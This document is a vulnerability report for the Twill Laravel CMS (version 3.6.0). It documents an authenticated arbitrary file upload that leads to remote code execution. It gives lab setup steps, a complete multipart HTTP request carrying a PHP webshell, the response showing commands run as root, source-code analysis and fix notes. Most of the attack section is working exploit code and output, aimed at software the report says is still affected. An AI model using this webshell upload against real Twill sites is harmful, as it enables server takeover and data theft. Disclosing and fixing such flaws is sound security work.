### Vulnerability details

**Official website / Product:** https://twill.io / https://github.com/area17/twill

**Repository:** area17/twill (stars at selection: 3972)

**Vulnerability type:** file_upload → RCE / getshell (Media Library arbitrary PHP upload)

**Affected versions:** 3.6.0 (lab; tag `3.6.0` / commit `d763dee`); same sink present on current main

**Vulnerability URL / Parameter:** `POST /admin/media-library/medias` — params `qqfilename`, `qqfile`, `unique_folder_name`, `width`, `height`; executed via `GET /storage/uploads/<uuid>/<sanitized>.php`

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/twill-r10a7` and image `twill-r10a7:php83` may have been cleaned). Stack: Laravel 11 + `area17/twill` **3.6.0** (tag/commit `d763dee`), SQLite, PHP built-in server on host port **19007**, `network_mode: host`. Reconstructable files:

```dockerfile
# Dockerfile → image twill-r10a7:php83
FROM php:8.4-cli
RUN apt-get update && apt-get install -y git unzip libsqlite3-dev \
 && docker-php-ext-install pdo_sqlite \
 && curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
WORKDIR /var/www/html
RUN composer create-project laravel/laravel:^11.0 . --no-interaction \
 && composer require area17/twill:3.6.0 --no-interaction \
 && touch database/database.sqlite \
 && sed -i 's/DB_CONNECTION=.*/DB_CONNECTION=sqlite/' .env \
 && sed -i 's#DB_DATABASE=.*#DB_DATABASE=/var/www/html/database/database.sqlite#' .env \
 && php artisan twill:install --no-interaction || true
# After first boot: twill:superadmin, create Publisher, storage:link (see step notes)
CMD ["php", "artisan", "serve", "--host=0.0.0.0", "--port=19007"]
```

```yaml
# docker-compose.yml (project dir name twill-r10a7 → container twill-r10a7)
services:
  twill:
    build: .
    image: twill-r10a7:php83
    container_name: twill-r10a7
    network_mode: host
```

```bash
docker compose up -d --build
# Inside the container (or via docker exec -it twill-r10a7 bash):
php artisan twill:superadmin admin@lab.local 'Admin123!'
php artisan storage:link       # links public/storage → ../storage/app/public
# Create Publisher (users.role must be enum KEY "PUBLISHER", not display "Publisher"):
# Prefer: log in as SuperAdmin → People → New user (role Publisher).
# Or tinker (Twill user model / twill_users table):
php artisan tinker --execute="\$u=new \A17\Twill\Models\User(['name'=>'Publisher','email'=>'publisher@lab.local','role'=>'PUBLISHER','published'=>1]);\$u->password='Admin123!';\$u->save();"
```

Expected `docker compose ps` / `docker ps` topology (from lab bring-up):

```
NAME          IMAGE               COMMAND                  SERVICE   STATUS
twill-r10a7   twill-r10a7:php83   "docker-php-entrypoi…"   twill     Up
```

Media disk: `twill.media_library.disk` → `public` under `storage/app/public/uploads`; after `storage:link`, `/storage/uploads/<uuid>/<file>` is web-reachable and `.php` executes under `php artisan serve`.
2. Accounts:
   - SuperAdmin: `admin@lab.local` / `Admin123!`
   - Publisher: `publisher@lab.local` / `Admin123!` (`users.role` must store enum KEY **`PUBLISHER`**; the display string `Publisher` breaks `UserRole::Publisher()`)
3. Open `http://127.0.0.1:19007/admin/login` in a browser or via curl, log in as Publisher, capture `laravel_session` and `XSRF-TOKEN` cookies; set request header `X-XSRF-TOKEN` to the URL-decoded cookie value (Laravel convention). Cookies/tokens in the PoC below are from the recorded session — replace with a fresh session when replaying.
4. Pick any UUID as `unique_folder_name` (attacker-controlled; PoC uses `96cdf9b3-7006-4548-ac91-12c334b61668`). With session + CSRF, POST to `/admin/media-library/medias` with `qqfilename=rce.php`, `qqfile`=PHP webshell (`Content-Type: image/jpeg` is fine), and `width=10` & `height=10` (both present → skips `getimagesize`).
5. Response `success:true` with `media.name=rce.php`. **Do not** use the Glide `/img/...` URLs from the JSON (they do not execute PHP); instead `GET /storage/uploads/<uuid>/rce.php?c=id` → `MEDIA_RCE:...uid=0(root)`.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /admin/media-library/medias HTTP/1.1
Host: 127.0.0.1:19007
Accept: application/json
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IlE2cTd1OHhvc1hZU3hFMHovaWtFRVE9PSIsInZhbHVlIjoiRDJTQ3V4RDNESEpuZ3hoWXgvZXEvY3B2SFJCNllpcytPR1RuL3dMNlo0aGF2eDNTcVZNNzkwR3N2Sm1sM0k5SFo3N1JkdjQzcmk5c2ZNNnhidjF4L2FMdjVnWXY3UWtmMndzWCtscDc4blN6dVVoTk1IaDFsTXV4QW5aOEFsMHgiLCJtYWMiOiIyZGRlMzE5NjBkNmI3ZDA2ODM2YTg4YWQzMTdkZDYzMGU4YTRkYzFiNWI5NjAyNTFiNzg5NDdhNDZiOWVlMWM5IiwidGFnIjoiIn0=
Cookie: XSRF-TOKEN=eyJpdiI6IlE2cTd1OHhvc1hZU3hFMHovaWtFRVE9PSIsInZhbHVlIjoiRDJTQ3V4RDNESEpuZ3hoWXgvZXEvY3B2SFJCNllpcytPR1RuL3dMNlo0aGF2eDNTcVZNNzkwR3N2Sm1sM0k5SFo3N1JkdjQzcmk5c2ZNNnhidjF4L2FMdjVnWXY3UWtmMndzWCtscDc4blN6dVVoTk1IaDFsTXV4QW5aOEFsMHgiLCJtYWMiOiIyZGRlMzE5NjBkNmI3ZDA2ODM2YTg4YWQzMTdkZDYzMGU4YTRkYzFiNWI5NjAyNTFiNzg5NDdhNDZiOWVlMWM5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImJQZXdXZ2t5R2pMTGMwdUlJQ2llVWc9PSIsInZhbHVlIjoiZ0VYcDZyWkNIelhadFJyK0hYY2xoNnQ2NXZjVW16cDU5OWJiTUE2OU85cjd4VzNNTENjRnlRRk1JNUxYeXc4Y003RDcyd0ZvdTNBbGdGNDhvSklZRHBpWWtzUER0MHFWVHhOOW5ZWWFBZ2RzandNOXRXbVVqbFdDeTB6K2hSUDUiLCJtYWMiOiI2MDRlOGUyODRlNzM3YzA1MjQ0MTUwMTA4NTMzZmJiMjU4MTg3YzA3MTRmNmRkODg4MDMwYmE4M2ViMWZkZDYxIiwidGFnIjoiIn0%3D
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 658
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="qqfilename"

rce.php
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="unique_folder_name"

96cdf9b3-7006-4548-ac91-12c334b61668
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="width"

10
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="height"

10
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="qqfile"; filename="rce.php"
Content-Type: image/jpeg

<?php echo "MEDIA_RCE:".php_uname().":"; system($_GET["c"] ?? "id");

------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Host: 127.0.0.1:19007
Connection: close
X-Powered-By: PHP/8.4.27
Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private
Date: Sun, 01 Nov 2026 13:31:41 GMT
Content-Type: application/json
Pragma: no-cache
Expires: Sat, 01 Jan 1990 00:00:00 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlE2cTd1OHhvc1hZU3hFMHovaWtFRVE9PSIsInZhbHVlIjoiRDJTQ3V4RDNESEpuZ3hoWXgvZXEvY3B2SFJCNllpcytPR1RuL3dMNlo0aGF2eDNTcVZNNzkwR3N2Sm1sM0k5SFo3N1JkdjQzcmk5c2ZNNnhidjF4L2FMdjVnWXY3UWtmMndzWCtscDc4blN6dVVoTk1IaDFsTXV4QW5aOEFsMHgiLCJtYWMiOiIyZGRlMzE5NjBkNmI3ZDA2ODM2YTg4YWQzMTdkZDYzMGU4YTRkYzFiNWI5NjAyNTFiNzg5NDdhNDZiOWVlMWM5IiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 15:31:41 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6ImJQZXdXZ2t5R2pMTGMwdUlJQ2llVWc9PSIsInZhbHVlIjoiZ0VYcDZyWkNIelhadFJyK0hYY2xoNnQ2NXZjVW16cDU5OWJiTUE2OU85cjd4VzNNTENjRnlRRk1JNUxYeXc4Y003RDcyd0ZvdTNBbGdGNDhvSklZRHBpWWtzUER0MHFWVHhOOW5ZWWFBZ2RzandNOXRXbVVqbFdDeTB6K2hSUDUiLCJtYWMiOiI2MDRlOGUyODRlNzM3YzA1MjQ0MTUwMTA4NTMzZmJiMjU4MTg3YzA3MTRmNmRkODg4MDMwYmE4M2ViMWZkZDYxIiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 15:31:41 GMT; Max-Age=7200; path=/; httponly; samesite=lax

{"media":{"id":3,"name":"rce.php","thumbnail":"http:\/\/127.0.0.1:19007\/img\/96cdf9b3-7006-4548-ac91-12c334b61668\/rce.php?fm=jpg&q=60&fit=max&dpr=1&h=256","original":"http:\/\/127.0.0.1:19007\/img\/96cdf9b3-7006-4548-ac91-12c334b61668\/rce.php","medium":"http:\/\/127.0.0.1:19007\/img\/96cdf9b3-7006-4548-ac91-12c334b61668\/rce.php?fm=jpg&q=80&fit=max&h=430","width":"10","height":"10","tags":[],"deleteUrl":"http:\/\/127.0.0.1:19007\/admin\/media-library\/medias\/3","updateUrl":"http:\/\/127.0.0.1:19007\/admin\/media-library\/medias\/single-update","updateBulkUrl":"http:\/\/127.0.0.1:19007\/admin\/media-library\/medias\/bulk-update","deleteBulkUrl":"http:\/\/127.0.0.1:19007\/admin\/media-library\/medias\/bulk-delete","metadatas":{"default":{"caption":null,"altText":"Rce","video":null},"custom":{"caption":null,"altText":null,"video":null}}},"success":true}
```

Verification result notes:

Upload returned `success:true` with `media.name=rce.php`. Follow-up:

```http
GET /storage/uploads/96cdf9b3-7006-4548-ac91-12c334b61668/rce.php?c=id HTTP/1.1
Host: 127.0.0.1:19007
Accept: */*
Connection: close

HTTP/1.1 200 OK
Host: 127.0.0.1:19007
Date: Sun, 01 Nov 2026 13:31:41 GMT
Connection: close
X-Powered-By: PHP/8.4.27
Content-type: text/html; charset=UTF-8

MEDIA_RCE:Linux kali 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64:uid=0(root) gid=0(root) groups=0(root)
```

Confirms PHP execution on a web-reachable path (getshell). Glide `/img/...` does not execute PHP; use `/storage/uploads/`. Impact line from the follow-up above: `MEDIA_RCE:...uid=0(root) gid=0(root) groups=0(root)`.

### Vulnerability analysis

`MediaLibraryController::storeFile` takes client-controlled `qqfilename`, runs it through `sanitizeFilename`, and uses the result as the on-disk name. `sanitizeFilename` only normalizes ASCII/whitespace/multi-dot forms and **keeps `.php`**. `MediaRequest` for the local endpoint only requires `qqfilename`/`qqfile` — **no mimes/extension allow-list**. Config `twill.media_library.allowed_extensions` (default svg/jpg/gif/png/jpeg) is injected into the Vue uploader by `MediasUploaderConfig` as `allowedExtensions` and is never enforced in `storeFile`. When both `width` and `height` are present, `getimagesize($uploadedFile->path())` is skipped, so non-image content is accepted. The file is stored on `twill.media_library.disk` (default `public`) under `uploads/<uuid>/` (via `unique_folder_name`), linked via `storage:link` to `/storage/uploads/...`, where PHP executes `.php`.

`AuthServiceProvider` aliases `upload` to `edit-media-library` and grants it to **PUBLISHER** and **ADMIN**, so a content-editor role can getshell (SuperAdmin not required). `MediaLibraryController` guards `store` with `can:edit-media-library`.

Trigger / sink source (full path and line numbers, tag 3.6.0 / d763dee):

```php
# File: vendor/area17/twill/src/Http/Controllers/Admin/MediaLibraryController.php
# Lines: 170-215
public function storeFile($request)
{
    $originalFilename = $request->input('qqfilename');

    $filename = sanitizeFilename($originalFilename);

    $fileDirectory = $request->input('unique_folder_name');

    $uuid = $request->input('unique_folder_name') . '/' . $filename;

    if ($this->config->get('twill.media_library.prefix_uuid_with_local_path', false)) {
        $prefix = trim($this->config->get('twill.media_library.local_path'), '/ ') . '/';
        $fileDirectory = $prefix . $fileDirectory;
        $uuid = $prefix . $uuid;
    }

    $disk = $this->config->get('twill.media_library.disk');

    $uploadedFile = $request->file('qqfile');

    if ($request->input('width') && $request->input('height')) {
        $w = $request->input('width');
        $h = $request->input('height');
    } else {
        [$w, $h] = getimagesize($uploadedFile->path());
    }

    $uploadedFile->storeAs($fileDirectory, $filename, $disk);

    $fields = [
        'uuid' => $uuid,
        'filename' => $originalFilename,
        'width' => $w,
        'height' => $h,
    ];

    if ($this->shouldReplaceMedia($id = $request->input('media_to_replace_id'))) {
        $media = $this->repository->whereId($id)->first();
        $this->repository->afterDelete($media);
        $media->replace($fields);

        return $media->fresh();
    }

    return $this->repository->create($fields);
}
```

```php
# File: vendor/area17/twill/src/Helpers/media_library_helpers.php
# Lines: 78-97
function sanitizeFilename($filename)
{
    $sanitizedFilename = Str::ascii($filename);

    $invalid = [
        ' ' => '-',
        '%20' => '-',
        '_' => '-',
    ];

    $sanitizedFilename = str_replace(array_keys($invalid), array_values($invalid), $sanitizedFilename);

    $sanitizedFilename = preg_replace('#[^A-Za-z0-9-. ]#', '', $sanitizedFilename); // Remove all non-alphanumeric except .
    $sanitizedFilename = preg_replace('#\.(?=.*\.)#', '-', $sanitizedFilename); // Remove all but last .
    $sanitizedFilename = preg_replace('#-+#', '-', $sanitizedFilename); // Replace any more than one - in a row
    $sanitizedFilename = str_replace('-.', '.', $sanitizedFilename); // Remove last - if at the end
    $sanitizedFilename = strtolower($sanitizedFilename); // Lowercase

    return $sanitizedFilename; // keeps ".php"
}
```

```php
# File: vendor/area17/twill/src/Http/Requests/Admin/MediaRequest.php
# Lines: 12-19
public function rules()
{
    switch (config('twill.media_library.endpoint_type')) {
        case 'local':
            return [
                'qqfilename' => 'required',
                'qqfile' => 'required',
            ];
```

```php
# File: vendor/area17/twill/src/AuthServiceProvider.php
# Lines: 35 (ABILITY_ALIASES), 135-141
'upload' => ['edit-media-library'],
// ...
$this->define('upload', function ($user) {
    return $this->authorize($user, function ($user) {
        return $this->userHasRole(
            $user,
            [TwillPermissions::roles()::PUBLISHER, TwillPermissions::roles()::ADMIN]
        );
    });
});
```

```php
# File: vendor/area17/twill/src/Http/ViewComposers/MediasUploaderConfig.php
# Lines: 43, 77 (frontend-only injection)
$allowedExtensions = $this->config->get('twill.media_library.allowed_extensions');
// ...
'allowedExtensions' => $allowedExtensions,
```

### Fix notes

- Enforce `twill.media_library.allowed_extensions` (or MIME/`finfo`) server-side; reject `.php`/`.phtml`/double extensions.
- Have `sanitizeFilename` strip or rewrite dangerous extensions; use a server-generated safe name instead of trusting `qqfilename`.
- Always run `getimagesize`/image decode on uploads; treat `width`/`height` as metadata only.
- Disable PHP execution under `storage/app/public/uploads` at the web server.
